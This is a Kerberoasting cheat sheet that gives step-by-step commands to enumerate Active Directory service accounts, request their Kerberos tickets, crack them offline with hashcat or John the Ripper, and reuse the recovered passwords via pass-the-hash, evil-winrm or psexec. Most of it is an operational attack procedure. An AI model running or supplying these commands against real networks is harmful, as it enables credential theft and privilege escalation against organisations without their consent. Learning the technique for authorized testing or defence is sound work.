Kerberoasting - Cheat Sheet

Request Kerberos service tickets for accounts with SPNs registered in Active
Directory, then crack the tickets offline to recover the service account password.
Requires a valid low-privilege domain account to start.
Replace the placeholders (<...>) with your own values.


Step 1 - Find accounts with SPNs (Kerberoastable accounts)

From Kali with valid domain credentials:

    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>

This lists every account in the domain that has a ServicePrincipalName set.
Those accounts' tickets can be requested and cracked.


Step 2 - Request the service tickets and dump them

Add -request to pull the actual TGS tickets in crackable format:

    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip> -request

The output contains hashes in $krb5tgs$23$... format (RC4) or
$krb5tgs$18$... format (AES256 - harder to crack).

Save the output to a file:

    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip> -request \
        -outputfile <hash-file>


Step 3 - Crack the tickets offline

Option A - hashcat (RC4 tickets, mode 13100):

    hashcat -m 13100 <hash-file> <wordlist-path> --force

Option B - hashcat (AES256 tickets, mode 19700):

    hashcat -m 19700 <hash-file> <wordlist-path> --force

Option C - John the Ripper:

    john --format=krb5tgs --wordlist=<wordlist-path> <hash-file>

A successful crack gives you the plaintext password of the service account.


Step 4 - Use the cracked credentials

If the service account has elevated privileges (common for SQL, IIS, backup
service accounts), use the plaintext password to:
  - Authenticate via PtH / evil-winrm / psexec
  - Check if the account is a local admin on any machine
  - Check if the account has AD delegation rights


(optional) Restore Kali's networking

Only needed if you manually set a static IP before the attack:

    sudo nmcli con mod "<connection name>" ipv4.method auto
    sudo nmcli con up "<connection name>"


Key idea: any domain user can request a TGS ticket for any SPN. The ticket is
encrypted with the service account's NT hash. Kerberoasting abuses this by
requesting the ticket and cracking it offline - no noise on the target, no
failed logon events. Service accounts often have weak passwords and excessive
privileges, making them high-value targets.
